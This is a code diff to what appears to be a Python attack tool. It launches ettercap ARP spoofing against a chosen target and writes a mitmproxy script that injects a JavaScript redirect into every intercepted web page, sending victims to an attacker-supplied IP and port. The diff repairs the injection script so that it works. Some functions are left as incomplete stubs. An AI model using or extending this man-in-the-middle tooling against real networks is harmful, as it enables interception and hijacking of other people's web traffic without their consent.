@@ -6,6 +6,7 @@ import sys, traceback
 import os
 import subprocess as sp
 import time
+import re
 
 # Start banner
 os.system("cat src/banner.txt | lolcat")
@@ -55,7 +56,7 @@ def main():
                 print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mYou have to set your target IP first!")
             else:
                 with open('src/target.txt', 'r') as targetf:
-                    print("\n "" " "\u001b[35;1m[➔ Info]: " " Running ARP Spoofing...")
+                    print("\n "" " "\u001b[35;1m[➔ Info]: " "Running ARP Spoofing...")
                     time.sleep(0.5)
                     ettercommand = ("sudo ettercap -Tq -M ARP")
                     with open('src/arp.txt','r') as arp:
@@ -77,25 +78,28 @@ def main():
                 open('src/target.txt', 'w').close()
  
         def redirectlog():
-            print("\n" " " "\u001b[35;1m[➔ Alert]: " "\u001b[31; Please be sure to run htspoof on your target before setting your redirect IP")
+            print("\n" " " "\u001b[35;1m[➔ Alert]: " "\u001b[31;1m Please be sure to run htspoof on your target before setting your redirect IP")
             spoofip = input("\n"" " "\u001b[34;1mEnter the IP address to redirect to (IP:PORT): ")
-            dumpcommand = "flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = f'http://{spoofip}</script>'")"
-            print(dumpcommand)
 
             with open('src/dumpscript.py', 'w') as dumpscript:
-                dumpscript.write(dumpcommand)
+                dumpscript.write(f'''\
+import mitmproxy
+def response(flow):
+    flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = 'http://{spoofip}'</script>")
+                
+
+                ''')
                 try:
-                    os.popen("mitmdump -r src/dumpscript.py").read()
+                    os.popen("mitmdump -s src/dumpscript.py")
                     open('src/dumpscript.py/','w').close()
                 except:
-                    print("Mitmdump error")
-
+                    print("\n" " " "\u001b[35;1m[➔ Alert]: "  "Mitmdump error")
+                    os.popen("mitmdump -s src/dumpscript.py").read()
         def portal():
-            return 0
+            return "Portal command success - incomplete"
         
         def iplookup():
             lookupip = input("\n"" " "\u001b[34;1mEnter the IP address to lookup: ")
-
 
 
         def commands():
